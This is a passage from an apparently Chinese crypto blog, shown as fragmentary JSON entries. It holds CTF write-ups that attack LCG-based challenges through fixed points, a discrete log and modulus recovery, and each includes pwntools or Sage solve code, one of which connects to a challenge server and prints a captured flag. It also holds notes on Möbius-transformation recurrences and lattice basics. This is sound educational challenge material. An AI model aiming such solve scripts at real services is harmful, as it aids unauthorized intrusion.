，输入初始值$x_{0}$，然后预测$x_{r}$，预测成功并将我们设计得到的$x_{r}$（代码中设计为y）输入。 关键变量r也未知，那么可以考虑不动点解法。 先看一组式子： $$ \\begin{cases} x_{0} \u0026= x_{0} \\\\ x_{1} \u0026= ax_{0}+b \\\\ x_{2} \u0026= a^{2}x_{0}+b(a+1) \\\\ x_{3} \u0026= a^{3}x_{0}+b(a^2+a+1) \\end{cases} $$ $$ x_{n} = a^{n}x_{0}+ b\\left( \\sum^{n-1}_{i=0}a^{i} \\right) $$ 注意到 $$ \\frac{a^{n}-1}{a-1}= \\left( \\sum^{n-1}_{i=0} a^{i} \\right) $$ , 实际上可以写出一个较为简洁的关于第$n$项和首项的公式： $$ x_{n} = a^{n}x_{0}+ b\\frac{a^{n}-1}{a-1} $$ 这就符合我们控制的两个输入和输出。 首先不考虑模运算的存在，一个较好的情况是$x_{n}=x_{0},n=r$，$r$未知，那么考虑消除$r$对我们的影响： $$\\begin{aligned} \\frac{x_{r}}{x_{0}}\u0026=a^{r}+\\frac{b}{x_{0}} \\frac{a^{r}-1}{a-1}\\\\ 1\u0026=a^{r}+\\frac{b}{x_{0}} \\frac{a^{r}-1}{a-1} \\end{aligned}$$ OK，到了这里我们发现等式右边由$a^{n}$和一个系数$\\frac{b}{x_{0}}$控制的$a^{n}$构成，那么一个平凡的想法就是考虑两个系数互为相反数,那么尝试一下我们刚好发现等式恒成立。 令$\\frac{b}{x_{0}} \\frac{1}{a-1}=-1$ $$x_{0}= - \\frac{b}{a-1}$$ 代入恰好得： $$1 = a^{r}-(a^{r}-1)=1$$ 那么此时，只要已知$a,b$令$x_{0}=- \\frac{b}{a-1}$，这个递推数列就变成了常数数列，再考虑模运算自然也是无伤大雅。 from pwn import * conn = remote('be.ax', 31800) # conn = process(\"name.py\") p = 2**521 - 1 a = int(conn.recvline().decode().strip().split('a = ')[1]) b = int(conn.recvline().decode().strip().split('b = ')[1]) x = y = -b * pow(a - 1, -1, p) % p conn.sendlineafter(b'starting point: ', str(x).encode()) conn.sendlineafter(b'guess? ', str(y).encode()) print(conn.recvline().decode()) # corctf{r34l_psych1c5_d0nt_n33d_f1x3d_p01nt5_t0_tr1ck_th15_lcg!} 妙! 但是推导到这里，似乎有些凑巧。 先看下一题： ","date":"2024-04-06","objectID":"/fix-point/:2:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"Exchange Task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 a = randbelow(p) b = randbelow(p) s = randbelow(p) print(\"p =\", p) print(\"a =\", a) print(\"b =\", b) print(\"s =\", s) a_priv = randbelow(p) b_priv = randbelow(p) def f(s): return (a * s + b) % p def mult(s, n): for _ in range(n): s = f(s) return s A = mult(s, a_priv) B = mult(s, b_priv) print(\"A =\", A) print(\"B =\", B) shared = mult(A, b_priv) assert mult(B, a_priv) == shared flag = open(\"flag.txt\", \"rb\").read() key = sha256(long_to_bytes(shared)).digest()[:16] iv = long_to_bytes(randint(0, 2**128)) cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(iv.hex() + cipher.encrypt(pad(flag, 16)).hex()) 利用第二题推导的通项公式， $$\\begin{aligned} A \u0026= f_{n_{a}}(s)= a^{n_{a}}s+ b \\frac{a^{n_{a}}-1}{a-1} \\pmod{p}\\\\ A(a-1)+b\u0026=a^{n_{a}}(as-s+b) \\pmod{p}\\\\ a^{n_{a}} \u0026= \\frac{A(a-1)+b}{as-s+b} \\pmod{p} \\end{aligned}$$ 从上式的推导可以看出，$a^{n_{a}},a^{n_{b}}$可以由已知量导出。 这就回到了DH的一般思考场景。 验证得，$p-1$光滑，直接求解DLP，计算 $$ \\begin{aligned} n_{a} \u0026= DiscreteLog(a^{n_{a}},a,p)\\\\ shared \u0026= f_{n_{a}}(B)\\\\ \u0026= a^{n_{a}}B+b \\frac{a^{n_{a}}-1}{a-1} \\pmod{p} \\end{aligned} $$ 唯一未知量已可求解，获取了$shared$ 可以求解。 exp: sage: from Crypto.Util.number import long_to_bytes ....: from Crypto.Cipher import AES ....: from Crypto.Util.Padding import unpad ....: from hashlib import sha256 ....: ....: p = 1420310990296004100748571322452259950421339071747731134286191835424352805219828279086937099671748953466397461 ....: 17298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824 ....: 688304388119038321175358608957437054475286727321806430701729130544065757189542110211847 ....: a = 1180906598237265321184570154603935013535512571819012348308688052993667257580121658456389778783222827629290215 ....: 70278435511082796994178870962500440332899721398426189888618654464380851733007647761349698218193871563040337609238 ....: 025971961729401986114391957513108804134147523112841191971447906617102015540889276702905 ....: b = 5795014987100615243467302014637519655589220562695967625172441001618493582571250812112330936022277755982709396 ....: 54689652681477200276478424926550717060636693281351272022500409354148364163603509242184627980038782665632058932676 ....: 35176851677889275076622582116735064397099811275094311855310291134721254402338711815917 ....: s = 3570158135111160465491334886700707833940269177041036813362503042720279105776685310351097408959241134406576995 ....: 73708026173784951618374426701578277686774118710424015000713663174396814612714838808580074695024533617060019734419 ....: 02698612564888892738986839322028935932565866492285930239231621460094395437739108335763 ....: A = 2705569950255528261367920540242672730435988633782267523285646370856059877266600466366005252832869228207716559 ....: 02594950903882166292400533970414295870526111331638869384711648295375897115982531152701610900861800015012271649251 ....: 99272064309777701514693535680247097233110602308486009083412543129797852747444605837628 ....: B = 1321783200371127370097264683674718982421959235681582348717736070054240011526943389939787036890301472158431250 ....: 95282272730052868843423659165019475476788785426513627877574198334376818205173785102362137159225281640301442638067 ....: 549414775820844039938433118586793458501467811405967773962568614238426424346683176754273 ....: ct = bytes.fromhex('e0364f9f55fc27fc46f3ab1dc9db48fa482eae28750eaba12f4f76091b099b01fdb64212f66caa6f366934c3b9929 ....: bad37997b3f9d071ce3c74d3e36acb26d6efc9caa2508ed023828583a236400d64e') ....: sage: factor(p-1) 2 * 593603 * 635603 * 904901 * 910981 * 994141 * 1270897 * 14321","date":"2024-04-06","objectID":"/fix-point/:3:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"leapfrog 本题是对第一题的扩展,本题的任务是根据一些函数输出恢复$a,b,p$. 针对不连续的输出值，我们有以下处理方式 #task from Crypto.Util.number import long_to_bytes, getPrime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow from random import sample p = getPrime(256) a = randbelow(p) b = randbelow(p) s = randbelow(p) def f(s): return (a * s + b) % p jumps = sample(range(3, 25), 12) output = [s] for jump in jumps: for _ in range(jump): s = f(s) output.append(s) print(jumps) print(output) flag = open(\"flag.txt\", \"rb\").read() key = sha256(b\"\".join([long_to_bytes(x) for x in [a, b, p]])).digest()[:16] iv = long_to_bytes(randbelow(2**128)) cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(iv.hex() + cipher.encrypt(pad(flag, 16)).hex()) jumps = [5, 3, 23, 13, 24, 6, 10, 9, 7, 4, 19, 16] output = [26242498579536691811055981149948736081413123636643477706015419836101346754443, 30320412755241177141099565765265147075632060183801443609889236855980299685595, 65684356693401962957802832810273549345608027337432965824937963429120291339333, 15025547765549333168957368149177848577882555487889680742466312084547650972663, 46764069432060214735440855620792051531943268335710103593983788232446614161424, 71575544531523096893697176151110271985899529970263634996534766185719951232899, 8149547548198503668415702507621754973088994278880874813606458793607866713778, 12081871161483608517505346339140143493132928051760353815508503241747142024697, 65627056932006241674763356339068429188278123434638526706264676467885955099667, 23413741607307309476964696379608864503970503243566103692132654387385869400762, 56014408298982744092873649879675961526790332954773022900206888891912862484806, 77000766146189604405769394813422399327596415228762086351262010618717119973525, 14589246063765426640159853561271509992635998018136452450026806673980229327448] iv_c = 05ac5b17c67bcfbf5c43fa9d319cfc4c62ee1ce1ab2130846f776e783e5797ac1c02a34045e4130f3b8111e57397df344bd0e14f3df4f1a822c43c7a89fd4113f9a7702b0b0e0b0473a2cbac25e1dd9c 为了便于表示，我们引入$J_{i}$表示jumps中的第$i$个数，$S_{i}$表示jumps中的前$n$项和，显然地，我们得到： $J_{1}=5,J_{2}=3,\\dots;S_{0}=0,S_{1}=5,S_{2}=3\\dots$ 根据 def f(s): return (a * s + b) % p jumps = sample(range(3, 25), 12) output = [s] for jump in jumps: for _ in range(jump): s = f(s) output.append(s) 根据前期的推导： $$f_{n}(x_{0})=a^{n}x_{0}+b \\frac{a^{n}-1}{a-1} \\pmod{p}$$ 可以得到output中的表达结果为(如果记output列表为${ O_{i} }$： $$ O_{i}=f_{S_{i}}(s)= a^{S_{i}}s+ b \\frac{a^{S_{i}}-1}{a-1} \\pmod{p} $$ 那么对于12=len(jumps)个输出值和指数，我们得到了一簇$l=12$个方程。 在$\\mod{p}$的情况下，常见的思路就是加减消元。 不难观察到， $$a^{69} = \\frac{O_{9}-O_{6}}{O_{3}-O_{1}} \\pmod{p} \\tag{1}$$ 如果能够找到另外一个$a^{k}$,就给了我们进一步作差的思路: 如果能够找到两个式子$f_{1},f_{2}$满足: $$\\begin{cases} f_{1} = 0 \\\\ f_{2} = 0 \\end{cases} \\pmod{p}$$ 那么可以获得$k_{1}p=(f_{1},f_{2})$,那么此时的$k_{1}$相对小，可以通过可以接受的枚举，恢复出最终模数$p$. 对于$(1)$式，这样的一组$a^k,i_{1},i_{2},i_{3},i_{4}$ 对于$l=12$的情况，考虑枚举，来获得我们想要的 $$a^{k}= \\frac{O_{i_{1}}-O_{i_{2}}}{O_{i_{3}}-O_{i_{3}}} \\pmod{p}$$ sage: jumps = [5, 3, 23, 13, 24, 6, 10, 9, 7, 4, 19, 16] ....: ....: def f(i): ....: return a^i * s + b * sum(a^j for j in range(i)) ....: ....: P.\u003ca, s, b\u003e = PolynomialRing(QQ) ....: S = [0] + [sum(jumps[:i]) for i in range(1, len(jumps) + 1)] ....: Z = [f(s) for s in S] ....: ....: good = [] ....: for i1, i2, i3, i4 in Combinations(range(len(Z)), 4): ....: f_ = (Z[i4] - Z[i3])/(Z[i2] - Z[i1]) ....: if f_.denominator() == 1 and len(P(f_).coefficients()) == 1: ....: good.append((f_, i1, i2, i3, i4)) ....: ....: print(good) [(a^69, 1, 3, 6, 9), (a^79, 1, 4, 7, 11), (a^95, 1, 4, 9, 12), (a^92, 2, 3, 9, 11), (a^60, 2, 4, 5, 10), (a^49, 4, 6, 8, 11), (a^55, 5, 7, 11, 12), (a^30, 6, 8, 10, 11), (a^39, 7, 9, 11, 12)] 欣喜地，观察到 $$\\begin{cases} a^{69}=a^{39}a^{30} \\\\ a^{60}=a^{30}a^{30} \\\\ a^{79}=a^{30}a^{49} \\end{cases}$$ 那么符合条件的$f_{1},f_{2},f_{3}$已找到 恢复$p$: #sage sage: f1 = (O[9] - O[6]) * (O[8] - O[6]) * (O[9] - O[7]) - (O[11] - O[10]) * (O[12] - O[11]) * (O[3] - O[1]) ....: f2 = (O[10] - O[5]) * (O[8] - O[6])^2 - (O[11] - O[10]) ^ 2 * (O[4] - O[2])","date":"2024-04-06","objectID":"/fix-point/:4:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"一阶线性递推数列 对于形如$a_{n+1}=pa_{n}+q$，其中$p,q$为常数，$p \\ne 1$称为一阶常系递推数列。 给出一个简化过程; 先设$a_{n+1}=ka_n+d$ 再假设我们期待的构造好的等比数列形式$a_{n+1}-p=k(a_n-p)$ 用后一式的两端同时对前一式的两端作差，可得： $(a_{n+1}-p)-a_{n+1}=k(a_n-p)-(ka_n+d)$ $$\\Rightarrow-p=-kp-d\\Rightarrow\\quad p=kp+d$$ 最后一个式子显然说明所需要的常数$p$就是函数$f(x)=kx+d$的不动点。 从几何上讲，从截距不为零的一次函数(对应于上述非齐次一阶线性递推关系式)变形为正比例函数(对应于构造出来的等比数列满足的关系式)的变换就是一种图象平移操作，而此类函数的不动点提供了同时沿y轴方向和x轴方向进行图象平移的距离参考值。 前面的推到已经证明了这样的数列的通项公式为 $$a_{n}=a_{1}p^{n-1}+ q \\frac{1-p^{n-1}}{1-p}$$ ","date":"2024-04-06","objectID":"/fix-point/:5:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"一阶常系数分式线性递推关系式的概念及其通项的待定系数解法 一阶常系数分式线性递推关系式，形如：$$a_{n+1}= \\frac{Aa_{n}+B}{Ca_{n}+D}(n \\in \\mathbb{N^{+}},A,B,C,D \\in \\mathbb{R}，AD-BD \\ne 0)$$ 不动点方法： 设函数$f(x)= \\frac{Ax+B}{Cx+D},x,A,B,C,D \\in \\mathbb{C},AD-BC \\ne 0$,其不动点为 $$x=\\lambda=f(\\lambda)\\tag{2}$$ 令$x_{0}$为$(2)$的任意一个根，从而$x_{0}$是一个不动点; $$\\begin{aligned} a_{n+1}-x_{0} \u0026= \\frac{Aa_{n}+B}{(Ca_{n}+D)}-x_{0} \\\\ \u0026=\\frac{(A-Cx_{0})(a_{n}-x_{0})}{Ca_{n}+D} \\\\ \\frac{1}{a_{n+1}-x_{0}}\u0026= \\frac{Ca_{n}+D}{(A-Cx_{0})(a_{n}-x_{0})} \\\\ \u0026=\\frac{Cx_{0}+D}{A-Cx_{0}} \\frac{1}{a_{n}-x_{0}}+ \\frac{C}{A-Cx_{0}} \\end{aligned}$$ 由上式可知， $$\\set{ \\frac{1}{a_{n}-x_{0}} }$$ 整体来说，是一个一阶常系数线性递推数列，且包含有取值为常值的非齐次项。 对于关于$\\lambda$方程$\\lambda=f(\\lambda)$，对其解进行分类讨论: $i.$ 方程$(2)$的两个根为重根：$x_{1}=x_{2}= \\frac{A-D}{2C}$ 特别地，对于$\\frac{Cx_{1}+D}{A-Cx_{1}}=1$时，可以继续化简： $$\\frac{1}{a_{n+1}-x_0}=\\frac{Cx_0+D}{A-Cx_0}\\frac{1}{a_n-x_0}+\\frac C{A-Cx_0}=\\frac{1}{a_n-x_0}+\\frac C{A-Cx_0}$$ 即：$\\frac{1}{a_{n}-x_{0}}$变为以$\\frac{1}{a_{n}-x_{0}}$为首项，$\\frac{C}{A-Cx_{0}}$为公差的等差数列，容易知道通项公式： $$\\frac{1}{a_{n}-x_{0}}=\\frac{1}{a_{n}-x_{0}}+\\frac{2C(n-1)}{A+D}$$ 从而容易的推出$a_{n}$的解析式。 $ii.$ 如果不动点方程$(2)$有两个相异的根$x_{1},x_{2}$，那么类似地，考虑两侧同时减去不动点的思路： $$ \\begin{cases} a_{n+1}-x_{1}= \\frac{(A-Cx_{1})(a_{n}-x_{1})}{Ca_{n}+D}\\\\ a_{n+1}-x_{2}= \\frac{(A-Cx_{2})(a_{n}-x_{2})}{Ca_{n}+D} \\end{cases} $$ 考虑分母相同，两式作商： $$\\frac{a_{n+1}-x_{1}}{a_{n+1}-x_{2}}=k \\cdot \\frac{a_{n}-x_{1}}{a_{n}-x_{2}},k=\\frac{A-Cx_{1}}{A-Cx_{2}}$$ 易知，$\\set{\\frac{a_{n}-x_{1}}{a_{n}-x_{2}}}$是以$\\frac{a_{1}-x_{1}}{a_{1}-x_{2}}$为首项，$k$为公比的等比数列 代换得出$a_{n}$的解析式并不困难。 那么他们从何而来？ ","date":"2024-04-06","objectID":"/fix-point/:6:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"分式线性变换的概念与分式线性递推式的不动点解法由来 定义：具有以下形式的函数$f:\\mathbb{C} \\rightarrow \\mathbb{C}$,称为分式线性变换（linear fractional transformation): $$f(x) = \\frac{Ax+B}{Cx+D}\\quad(A,B,C,D \\in \\mathbb{C},AD-BC \\ne 0)$$ 因为德国数学家奥古斯特·莫比乌斯曾对其进行过大量研究，所以分式线性变换也叫做莫比乌斯变换（Möbius transformation） 因式分解后可把$f(x)$写成： $$f(x)=\\frac{BC-AD}C\\frac1{Cx+D}+\\frac AC$$ 可以验证在实数域上，这是一个可逆变换，具有以下性质： $y=f(x)$的逆变换为$x= \\frac{-Dy+B}{Cy-A}$。 一次函数是一个特殊情况。 分式线性变换之间的复合结果仍然是分式线性变换。 根据不动点的性质，对于变换及其逆变换，不动点一一对应。 为什么两边同时减去不动点？ 按照待定系数法的思路，假定对分式线性变换解析式的$f(x)$两侧同时减去某个合适的常数P再同时取倒数后，能得到形式一致的分母。先 $$ \\begin{aligned}\u0026\\text{做第一步减法,得:}\\\\\u0026a_{n+1}-P=\\frac{Aa_n+B}{Ca_n+D}-P=\\frac{Aa_n+B-PCa_n-DP}{Ca_n+D}=\\frac{(A-PC)a_n+(B-DP)}{Ca_n+D}\\end{aligned} $$ 要使上面的式子取倒数后的分母满足要求，由于分母取倒数前是位于分子的位置，基于前面的解题实例可知，我们只需要保证上式最左边的量与最右边的分子形式相似即可。 即只需要使$a_{n+1}-P$与$(A-PC)a_n+(B-DP)$的对应系数成相同比例即可。即： $$\\begin{aligned}\\frac{1}{A-PC}=\\frac{-P}{B-DP}\\end{aligned}$$ $$P=\\frac{B-DP}{CP-A}$$ 显然，这个所需的P值是$f(x)$的反函数的不动点。根据前面总结的性质，可知P也是$f(x)$的不动点。 即对$f(x)$两侧同时减去其不动点后，再取同时倒数，就一定能构造出一次的常系数非齐次递推式。 桥函数 上述推导，无论赛题或概念都在中间利用了大量中间函数。 考虑到分式线性变换性质3.，我们继续探究： 首先由于一次函数属于特殊的分式线性变换，而且分式线性变换是可逆变化，所以自然想到能否将分式线性递推式还原为某种更简单的一次线性递推式的形式。求出与之相关的一次线性递推式的迭代结果后，再利用逆变换反推出原递推式的多次迭代结果。 另一方面，我们已经知道使用不动点法可以简化一次线性递推式的求解，我们希望将不动点也整合到分式线性变换还原为线性递推式的系数配凑过程中。 定义: 使得$f(x)$可以与另一个函数$g(x)$建立下列联系的可逆函数$T(x)$叫做桥函数： $$f(x)= T^{-1}(g(T(x)))$$ 此时，$f(x)$和$g(x)$叫做关于桥函数$T(x)$的一对相似函数,或者说$f(x)$和$g(x)$关于桥函数$T(x)$互为相似函数。 用拓扑学术语来说，桥函数是一种同胚变换(homeomorphism) 它建立了$f(x)$和$g(x)$之间的拓扑共轭(topological conjugacy) 笔者的拓扑记忆也是较为模糊，如有疏漏欢迎勘误。 桥函数是计算函数迭代或构造数列的辅助函数。 通过找到合适的桥函数，将不易得到迭代公式的$f(x)$转化为容易得到迭代公式的形式更简单的$g(x)$, 计算完$g(x)$的$n$次迭代后，再使用桥函数的逆变换（性质保证逆变换一定存在）。应用这种思路把函数迭代问题转化为寻找一个良好的桥函数问题。 那么很容易的，可以得到使用不动点法的动机： 借住不动点，可以探测目标桥函数的一些性质，以便确定桥函数的待定系数。只要确定了待定系数的细节，就可以通过相似变换的方法得到原函数的$n$次迭代式。 ","date":"2024-04-06","objectID":"/fix-point/:7:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"举例 假设$f(x)=T^{-1}(g(T(x)))$,且$x_{0}$是$f(x)$的不动点，那么$T(x_{0})$一定也会是$g(x)$的不动点。这说明，如果求出$f(x)$的不动点，并且找到结构合适的$T(x)$，那么$g(x)$的不动点是不言自明的。 通常为了便于求解$g(x)$的$n$次迭代式，可以尝试将$g(x)$取为如下形式： $$\\begin{aligned} \u0026\\bullet g(x) =x+a \\\\ \u0026\\bullet g(x) =ax \\\\ \u0026\\bullet g(x) =ax^2 \\\\ \u0026\\bullet g(x) =ax^3 \\end{aligned}$$ 对于这几种情况，$g(x)$的不动点为0或$\\infty$。此时如果$f(x)$只有唯一的不动点a，可以考虑取$g(x)=x-a$或$g(x)=\\frac1{x-a}$;如果$f(x)$有2个相异的不动点a和b，则可以考虑取$g(x)=\\frac{x-a}{x-b}$。 这样的桥函数思想是优美的。 另举一例 (from TSG-CTF 2023) import os import random import string flag = os.getenv(\"FLAG\", \"FAKECTF{THIS_IS_FAKE}\") key = [random.randrange(10 ** 4) for _ in flag] cs = string.printable[:-6] def r(k): for _ in range(k): random.seed(x := random.randrange(20231104, 20231104 * 10)) return x random.seed(int(input(\"seed: \"))) print('flag:', ''.join([cs[(cs.index(f) + r(k)) % len(cs)] for f, k in zip(flag, key)])) ","date":"2024-04-06","objectID":"/fix-point/:8:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"1.Lattice(格) 基础 基于数学与计算机，现代密码学诞生。 ","date":"2024-04-04","objectID":"/lattice-part-0/:0:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.1 Lattice 系统性的定义一下Lattice的话，那么我们可以说Lattice是R^n这个空间中的一个离散的、具有加法运算的子群（A discrete additive subgroup）。 结合可视化工具，这里给出辅助理解的图像： 结合向量空间的概念，不难理解**格（Lattice)与基（bases)**的概念 ","date":"2024-04-04","objectID":"/lattice-part-0/:1:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2 Lattice 的基本属性 ","date":"2024-04-04","objectID":"/lattice-part-0/:2:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.1 Lattice 的密度 即可理解为对应维度的向量空间内球体内所含有的格点数和球体体积之比（或超球体） ","date":"2024-04-04","objectID":"/lattice-part-0/:2:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.2 最短距离 λ 将λ视为一个函数，λ1被定义为两格点间最小距离，推广至λn 诸多λ遵循偏序关系: $$ \\lambda_1\\leqslant\\lambda_2\\leqslant……\\lambda_n-1\\leqslant\\lambda_n $$ 那么请注意到：取等条件： 选定笛卡尔坐标下的格 此时 $$ \\lambda_1 =\\lambda_2= …… =\\lambda_n =1 $$ ","date":"2024-04-04","objectID":"/lattice-part-0/:2:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.3 距离函数 μ（t,L） 注意到格是一个子群。 任取向量空间内一点，那么我们讨论距离这一点最近的一个格点，给出一些定义： 距离函数(Distance Function): μ（t,L），认为μ的本质为数量 点 t $$ \\mu (t, L)= \\min_{x∈L} \\left | t-x \\right | $$ ","date":"2024-04-04","objectID":"/lattice-part-0/:2:3","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.2.4 覆盖半径 μ（L) 类似地，我们认为t为动点，此时寻找μ的最大值。给出定义： 覆盖半径（Covering Radius): μ（L) $$ \\mu (L)= \\max_{x∈span(L)} μ(t,L) $$ 对覆盖的理解： 以格点为圆心，不断扩大半径，可以容易地找到当各个圆刚好覆盖整个向量空间地时候，此时半径恰好为μ（L）。 这和Lattice 的Smoothing 高度相关。 ","date":"2024-04-04","objectID":"/lattice-part-0/:2:4","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.3 Minkowski凸集定理 Fundamental Region: 为了辅助理解： 数学上，给出一个拓扑空间和在其上作用的群，一个点在群作用下的像是这个作用的一个轨道。一个基本域是这个空间的一个子集，包含了每个轨道中恰好一点。基本域具体地用几何表现出抽象的轨道代表集。 构造基本域的方法有很多。一般会要求基本域是连通的，又对其边界加上一些限制，例如是光滑或是多面的。——wikipedia 凸集：暂可以理解为是一个多维空间的一部分（一个多维物体）(详细可见References) 叠加了线性变换： 重要应用： 给出了一个Lattice中，最短向量的一个上限值 ","date":"2024-04-04","objectID":"/lattice-part-0/:3:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"最短向量 对于一个Lattice，最短向量是指该Lattice中长度最小的非零向量，而（距离原点）距离最远的最短向量则是指该Lattice中长度最小的非零向量与原点的距离最远的那个向量。这个向量通常被称为Lattice的第一个近邻向量或最优向量。 计算Lattice的最短向量和最远的最短向量是一个重要的问题，因为它们在很多应用中都有着重要的作用。其中，计算最短向量是一个NP难问题，而计算最远的最短向量则是一个NP难问题的变体。目前，已经有很多算法被提出来用于解决这些问题，但是在实际应用中，它们的效率和精度都有一定的限制。 这里给出二维的表述： 坐标平面上任何包含原点的、面积大于4的、凸的、关于原点对称的闭区域一定含有异于原点的整点。 ","date":"2024-04-04","objectID":"/lattice-part-0/:3:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"1.4Minkowski第二定理 Steven的理解： 结合向量空间，可以认为明可夫斯基第二定理给出了对于所有最短向量的的取值上限。 当然我们对det（L）做一些详细解释，以便结合曾经的明可夫斯基不等式来理解这一定理： 行列式的几何意义 $$ X^T = (a,c),X'^T = (b,d)\\ det(X^T,X'^T) = S $$ 二维情况下，行列式可以理解为对应平行四边形的面积。（暂不考虑复平面）注意我们这里将这一面积视为有向面积。（考虑到行列式的符号） 行列式的部分性质 行列式为零当且仅当两个向量共线（线性相关），这时平行四边形退化成一条直线[9] 行列式是一个双线性映射。 $$ det(λX+μY,X') =λdet(X,X')+ μ(Y,X') \\ det(X,λX'+μY') =λdet(X,X')+ μ(X,Y') $$ 在基本了解行列式之后，不难在向量空间中理解第二定理所给出的不等式。 介绍一下代数层面的理解过程： 明可夫斯基不等式给出了LP空间上的三角不等式的表达，那么第二定理则可以在LP空间以介值的方式进行理解。 明可夫斯基,相信各大赛区的“羟基选手”都很熟悉（bushi），以它来引入某一空间，那么同样的，在此空间内理解第二定理。 2.Problem in Lattice （BasisOfCrypto) 在本章节仅仅罗列了一些难解问题 维基百科中的本章内容 ","date":"2024-04-04","objectID":"/lattice-part-0/:4:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.1 SVP（Shortest Vector Problem） SVP定义： 给定一个基为的Lattice ，找到一个这个基构成的格点，使得这个点距离0坐标点的距离最近。 $$ BX :X∈ \\mathbb{Z^k}\\ \\left | Bx \\right | \\le \\lambda_1 $$ 可视化： 如果所得到基底不合适，那么计算最短向量就不是一件容易的事情了。 断言：严格的计算最短向量是困难的。 这里并不给出其NP-Hard属性的证明。 Simplify: $$ SVP_γ $$ $$ BX :X∈ \\mathbb{Z^k}\\ \\left | Bx \\right | \\le γ\\lambda_1 $$ 这时候的解，则不唯一了。 ","date":"2024-04-04","objectID":"/lattice-part-0/:5:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.2CVP （Closest Vector Problem）CVP定义： 给定连续空间中任意的一个点t，找到距离这个点最近的格点Bx。 此时的t处于全集空间内，而寻找距离对应的距离最近的格点，这样一个问题。 约束距离：μ ,Lattice 的覆盖半径。 $$ Bx：x ∈\\mathbb{Z^k}\\ ||BX -t|| \\le \\mu $$ 覆盖半径μ给出了所有可能的t中距离格点的最长距离。 对CVP问题做同样的Simplify： $$ Bx：x ∈\\mathbb{Z^k}\\ ||BX -t|| \\le γ\\mu $$ 同样的不唯一。 ","date":"2024-04-04","objectID":"/lattice-part-0/:6:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.2.1 Bounded Distance Decording (Bounded Distance Decording) ","date":"2024-04-04","objectID":"/lattice-part-0/:6:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.2.2 Absolute Distancea Decording (Absolute Distancea Decording) ","date":"2024-04-04","objectID":"/lattice-part-0/:6:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.3SIVP（Shortest Independent Vector Problem) ","date":"2024-04-04","objectID":"/lattice-part-0/:7:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.4问题与联系 NP-HARD Association: 对于这里没有提到的GapSVP和GapSIVP问题，可以在wikipedia中找到详细介绍。 ","date":"2024-04-04","objectID":"/lattice-part-0/:8:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.4.1漏故而知新 理解了五大问题的基本思想和概念，那么我们把视野放在各个关系的联系上。 从ADD问题到SIVP问题： 几何上不难直观理解，找出SIVP的解，再以所得向量为基向量，不难得到ADD问题得解。 ： ","date":"2024-04-04","objectID":"/lattice-part-0/:8:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"2.4.2基于格的信息传递 3.Lattice的几何构造 在2.4中我们提到了取整。 在笛卡尔坐标系下，取整数格，CVP问题变得简单。通过上下取证，我们可以迅速解决问题。 通过把一组基进行变换，找到一组非常接近垂直的基向量的过程，称为 Lattice Basis Reduction ","date":"2024-04-04","objectID":"/lattice-part-0/:8:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.1 Gram-Schmidt 正交化 寻找一组正交向量作为基底，在Lattice中也有重大应用。 而应用的原理则为Det(L)的大小不随线性变换而改变。 ","date":"2024-04-04","objectID":"/lattice-part-0/:9:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.1.1基本形式 代数上： ","date":"2024-04-04","objectID":"/lattice-part-0/:9:1","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.1.2代码 给出基于numpy库和sympy的代码： Numpy: def my_gramSchmidt_np(vectors): #Eg:vecetors = np.array([[1,2],[3,4]]) def proj(x, u): u = unit_vec(u) return np.dot(x, u) * u def unit_vec(x): return x / np.linalg.norm(x) vectors = np.atleast_2d(vectors) if len(vectors) == 0: return [] if len(vectors) == 1: return unit_vec(vectors) u = vectors[-1] basis = my_gramSchmidt_np(vectors[0:-1]) w = np.atleast_2d(u - np.sum(proj(u, v) for v in basis)) basis = np.append(basis, unit_vec(w), axis=0) return basis Sympy: def my_gramSchmidt_sp(*vectors): normalize = True def project(a, b): return b * (a.dot(b, hermitian=True) / b.dot(b, 